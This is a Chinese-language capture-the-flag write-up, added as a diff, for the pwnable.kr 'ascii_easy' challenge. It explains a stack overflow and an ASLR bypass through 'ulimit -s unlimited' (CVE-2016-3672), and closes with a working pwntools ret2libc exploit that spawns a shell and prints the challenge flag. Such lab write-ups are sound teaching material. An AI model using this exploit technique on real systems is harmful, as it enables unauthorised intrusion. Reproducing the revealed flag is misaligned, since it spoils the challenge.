@@ -13466,3 +13466,245 @@ otp@pwnable:~$ python -c "import os, signal; signal.signal(signal.SIGXFSZ, signa
 
 ------
 
+### ascii_easy
+
+这是**Pwnable.kr**的第二十六个挑战`ascii_easy`，来自**[Rookiss]**部分。
+
+```bash
+We often need to make 'printable-ascii-only' exploit payload.  You wanna try?
+
+hint : you don't necessarily have to jump at the beggining of a function. try to land anyware.
+
+
+ssh ascii_easy@pwnable.kr -p2222 (pw:guest)
+```
+
+首先通过`ssh`远程连接目标主机。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
+└─$ ssh ascii_easy@pwnable.kr -p2222
+ascii_easy@pwnable.kr's password: 
+ ____  __    __  ____    ____  ____   _        ___      __  _  ____  
+|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \ 
+|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )
+|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    / 
+|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \ 
+|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \
+|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|
+                                                                     
+- Site admin : daehee87@khu.ac.kr
+- irc.netgarage.org:6667 / #pwnable.kr
+- Simply type "irssi" command to join IRC now
+- files under /tmp can be erased anytime. make your directory under /tmp
+- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal
+You have new mail.
+Last login: Thu Jun 22 16:14:20 2023 from 88.217.36.18
+```
+
+然后输入`ls -la`显示所有文件及目录，并将文件型态、权限、拥有者、文件大小等信息详细列出。
+
+```bash
+ascii_easy@pwnable:~$ ls -la
+total 1720
+drwxr-x---   5 root ascii_easy        4096 Nov  3  2017 .
+drwxr-xr-x 117 root root              4096 Nov 10  2022 ..
+-r-xr-sr-x   1 root ascii_easy_pwn    7624 Nov  3  2017 ascii_easy
+-rw-r--r--   1 root root              1041 Nov  3  2017 ascii_easy.c
+d---------   2 root root              4096 Aug  6  2014 .bash_history
+-r--r-----   1 root ascii_easy_pwn      52 Aug  6  2014 flag
+-r--r-----   1 root ascii_easy_pwn     141 Oct 27  2016 intended_solution.txt
+dr-xr-xr-x   2 root root              4096 Aug 20  2014 .irssi
+-rwxr--r--   1 root root           1717736 Oct 27  2016 libc-2.15.so
+drwxr-xr-x   2 root root              4096 Oct 23  2016 .pwntools-cache
+```
+
+用`checksec`查看二进制文件`ascii_easy`，可以看到`NX enabled`，这意味着堆栈中数据不可执行。
+
+```bash
+ascii_easy@pwnable:~$ checksec --file='./ascii_easy'
+[*] '/home/ascii_easy/ascii_easy'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+输入`cat ascii_easy.c`来查看`ascii_easy.c`的代码。
+
+```c
+ascii_easy@pwnable:~$ cat ascii_easy.c
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+#include <fcntl.h>
+
+#define BASE ((void*)0x5555e000)
+
+int is_ascii(int c){
+    if(c>=0x20 && c<=0x7f) return 1;
+    return 0;
+}
+
+void vuln(char* p){
+    char buf[20];
+    strcpy(buf, p);
+}
+
+void main(int argc, char* argv[]){
+
+    if(argc!=2){
+        printf("usage: ascii_easy [ascii input]\n");
+        return;
+    }
+
+    size_t len_file;
+    struct stat st;
+    int fd = open("/home/ascii_easy/libc-2.15.so", O_RDONLY);
+    if( fstat(fd,&st) < 0){
+        printf("open error. tell admin!\n");
+        return;
+    }
+
+    len_file = st.st_size;
+    if (mmap(BASE, len_file, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE, fd, 0) != BASE){
+        printf("mmap error!. tell admin\n");
+        return;
+    }
+
+    int i;
+    for(i=0; i<strlen(argv[1]); i++){
+        if( !is_ascii(argv[1][i]) ){
+            printf("you have non-ascii byte!\n");
+            return;
+        }
+    }
+
+    printf("triggering bug...\n");
+    vuln(argv[1]);
+
+}
+```
+
+`mmap`映射的内存被设置为可执行，因此我们可以使用。`mmap()`的函数声明如下：
+
+```c
+void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);
+```
+
+如果映射成功，该`mmap`函数将返回指向映射内存区域的指针。如果发生错误，则返回`MAP_FAILED`（通常定义为`(void *) -1`）。
+
+- `void *addr`：该参数指定映射内存区域所需的起始地址。如果`addr`是`NULL`，操作系统会自动选择地址，这里可以产生随机化。
+- `size_t length`：该`length`参数指定要映射的内存区域的长度（以字节为单位）。
+- `int prot`：该`prot`参数决定映射区域的内存保护。它可以是以下标志的组合：
+  - `PROT_READ`：可以读取页面。
+  - `PROT_WRITE`：可以写入页面。
+  - `PROT_EXEC`：可以执行页面。
+  - `PROT_NONE`: 页面可能无法访问。
+- `int flags`：该`flags`参数提供附加标志来控制内存映射的行为。一些常用的标志包括：
+  - `MAP_SHARED`：与其他进程共享此映射。
+  - `MAP_PRIVATE`：创建私有的写时复制映射。
+  - `MAP_FIXED`：将映射放置在 指定的确切地址处`addr`。
+  - `MAP_ANONYMOUS`：映射不与任何文件关联的内存。
+- `int fd`：`fd`参数为要映射的文件的文件描述符。它应该是通过打开文件或设备获得的有效文件描述符。
+- `off_t offset`：该`offset`参数指定文件内映射应开始的偏移量。通常设置为 0 以从文件开头开始映射。
+
+由于系统的`ASLR`随机化地址空间布局，每次`mmap`得到的地址均是不同的。`ASLR`是操作系统使用的一种安全技术，它的主要目标是通过对堆、栈、共享库映射等线性区内存布局的随机化，使攻击者难以预测重要系统组件（例如可执行代码、库和数据）的内存地址，从而增强系统的安全性，抵御各种类型的攻击，特别是与内存相关的漏洞。
+
+根据Linux ASLR漏洞**CVE-2016-3672**，当通过`ulimit -s unlimited`将栈大小设置为无限制后，在i386系统（或X86_64系统使用legacy模式模拟X86_32时）32位程序的`mmap`不会随机化，系统的`ALSR`将会失效，`ASLR`只会将栈随机化，而`mmap`得到的地址是固定的。
+
+阅读`Linux`系统内核源码`arch/x86/mm/mmap.c`，可以找到以下方法：
+
+```c
+/* * This function, called very early during the creation of a new * process VM image, sets up which VM layout function to use: */
+void arch_pick_mmap_layout(struct mm_struct *mm)
+{
+    mm->mmap_legacy_base = mmap_legacy_base();
+    mm->mmap_base = mmap_base();
+ 
+    if (mmap_is_legacy()) {
+        mm->mmap_base = mm->mmap_legacy_base;
+        mm->get_unmapped_area = arch_get_unmapped_area;
+        mm->unmap_area = arch_unmap_area;
+    } else {
+        mm->get_unmapped_area = arch_get_unmapped_area_topdown;
+        mm->unmap_area = arch_unmap_area_topdown;
+    }   
+}
+```
+
+可以看到，如果`mmap_is_legacy()`返回为真，`mmap_legacy_base()`函数用来计算当栈大小设置为无限制时的库文件位置，此时`mmap`的基址就是旧的`mmap_legacy_base`。`mmap_legacy_base()`函数的代码实现如下：
+
+```c
+/* * Bottom-up (legacy) layout on X86_32 did not support randomization, X86_64 * does, but not when emulating X86_32 */
+static unsigned long mmap_legacy_base(void)
+{   
+    if (mmap_is_ia32())
+        return TASK_UNMAPPED_BASE;
+    else
+        return TASK_UNMAPPED_BASE + mmap_rnd();
+}
+```
+
+我们通过注释也可以看出，如果是32位程序，那么在i386系统和32位模拟系统X86_32中，`mmap_legacy_base`是一个固定值，不会加上随机的偏移量`mmap_rnd()`。顺便一提，这个漏洞在后续版本`5.10.13`中已经修复啦：
+
+```c
+static unsigned long mmap_legacy_base(unsigned long rnd, unsigned long task_size)
+{
+	return __TASK_UNMAPPED_BASE(task_size) + rnd;
+}
+```
+
+综上所述，我们只需要设法让`mmap_is_legacy()`的返回值为真，就可以让`mmap`不进行随机化。`mmap_is_legacy()`函数的定义如下：
+
+```c
+static int mmap_is_legacy(void)
+{
+    if (current->personality & ADDR_COMPAT_LAYOUT)
+        return 1;
+    if (rlimit(RLIMIT_STACK) == RLIM_INFINITY)  // 检查栈大小 栈大小的值可以通过ulimit命令设置
+        return 1;
+    return sysctl_legacy_va_layout;
+}
+```
+
+只要通过`ulimit -s unlimited`将栈大小设置为`unlimited`，那么就会导致系统的`ASLR`失效，随后运行`32`位程序时得到的`mmap`都会是固定的地址值。编写`Python`代码构造`payload`可以得到`flag`：``damn you ascii armor... what a pain in the ass!! :(`。
+
+```python
+from pwn import *
+
+shell = ssh(user='ascii_easy', host='pwnable.kr', port=2222, password='guest')
+shell.set_working_directory(symlink=True)
+# shell.run('ulimit -s unlimited')
+# shell.download('./ascii_easy')
+shell_cmd = lambda cmd: shell.run(cmd).recvall().decode()
+# shell_cmd('ls')
+# shell.download('./libc-2.15.so')
+libc = ELF("./libc-2.15.so")
+libc.address = 0x5555e000
+
+CALL_EXECVE = 0x5561676a
+NULL_ADDR = 0x55564a3a
+PATH_ADDR = 0x556c2b59
+
+PATH = libc.string(PATH_ADDR).decode()
+shell(f'mkdir -p "{os.path.dirname(PATH)}"')
+shell(f'ln -s /bin/sh "{PATH}"')
+
+payload = cyclic(0x20)
+payload += p32(CALL_EXECVE)
+payload += p32(PATH_ADDR)  # filename
+payload += p32(NULL_ADDR)  # argv = {NULL}
+payload += p32(NULL_ADDR)  # envp = {NULL}
+
+io = shell.process(['ascii_easy', payload])
+io.recvuntil(b"$ ")
+io.sendline(b"cat flag")
+log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
+```
+
+------
+
